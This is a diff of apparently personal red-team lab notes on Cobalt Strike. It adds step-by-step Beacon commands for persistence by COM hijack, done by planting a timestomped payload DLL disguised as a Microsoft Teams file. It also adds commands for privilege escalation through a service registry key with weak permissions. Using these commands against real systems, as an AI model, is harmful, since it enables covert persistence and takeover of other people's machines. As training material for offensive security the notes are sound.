@@ -183,7 +183,7 @@ Use Invoke-Obfuscation to create a unique obfuscated version, or try the followi
 
 ## Save the changes (File > Save).
     Open the Cobalt Strike client and load resources.cna from C:\Tools\cobaltstrike\custom-resources.
-# Testing
+## Testing
 
     Host a 64-bit PowerShell payload.
         Go to Attacks > Scripted Web Delivery
@@ -213,6 +213,92 @@ Use Invoke-Obfuscation to create a unique obfuscated version, or try the followi
 <img width="1062" height="526" alt="image" src="https://github.com/user-attachments/assets/add66db3-6b75-48d1-badd-098f71736af4" />
 
     In this lab, you have bypasses Windows Defender by modifying Cobalt Strike's default artifacts, resources, and post-exploitation behaviours.
+
+# Initial Access
+
+## Persistence
+
+    Generate a DLL payload:
+        Payloads > Windows Stageless Payload
+        Listener: http
+        Output: Windows DLL
+        Exit Function: Thread
+        Click Generate.
+        Save it to C:\Payloads\http_x64.dll.
+
+    We choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.
+
+
+## COM Hijack
+
+From the Beacon running as pchilds:
+
+Change Beacon's working directory.
+
+beacon
+    cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
+Upload the DLL payload to disk.
+        upload C:\Payloads\http_x64.dll
+Rename and timestomp the DLL to help it blend in with the existing files.
+        mv http_x64.dll Microsoft.Teams.HttpClient.dll
+        timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
+Add the registry entries to perform the COM hijack:    
+        reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
+        reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
+
+Switch to Workstation 1 and login with Passw0rd!. From the Windows start menu, launch Microsoft Teams.
+Switch back to the Attacker Desktop and a new Beacon should appear from ms-teams.exe.
+## In this lab, you have leveraged COM hijacking to force a trusted, signed Microsoft application to load and run a Beacon payload for persistence.
+
+# Privesc
+## Enumeration
+The objective of this lab is to exploit weak registry permissions on a service for privilege escalation.
+Interact with the Beacon running as pchilds.
+Change the spawnto to msedge.
+    spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+Use PowerShell to search for services where low-priv users have FullControl rights.
+    powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
+
+return : This should return BadWindowsService.
+<img width="755" height="245" alt="image" src="https://github.com/user-attachments/assets/4cb7cff0-dec8-4064-99e0-848b6f4c87dc" />
+
+## Exploitation
+Set the spawnto for the service binary payload.
+        ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+Generate a service binary payload.
+        Payloads > Windows Stageless Payload.
+        Listener: http
+        Output: Windows Service EXE
+        Click Generate
+        Save to C:\Payloads\http_x64.svc.exe
+Stop the service.
+        sc_stop BadWindowsService
+Change Beacon's current working directory.
+        cd C:\Temp
+    Upload the payload to disk.
+        upload C:\Payloads\http_x64.svc.exe
+    Get the service's current binary path.
+        sc_qc BadWindowsService
+    Reconfigure the service to point to the payload.
+        sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
+    Start the service.
+        sc_start BadWindowsService
+The elevated Beacon should appear within a few seconds.
+<img width="972" height="503" alt="image" src="https://github.com/user-attachments/assets/e01a662b-0b0e-4b91-b111-2c739019fc6b" />
+
+Restore the service's binary path.
+beacon
+    sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2 
+Delete the service payload.
+    rm http_x64.svc.exe
+Start the service again.
+    sc_start BadWindowsService
+### In this lab, you have abused a weak service permission for privilege escalation.
+
+
+
+    
+
 
 
 
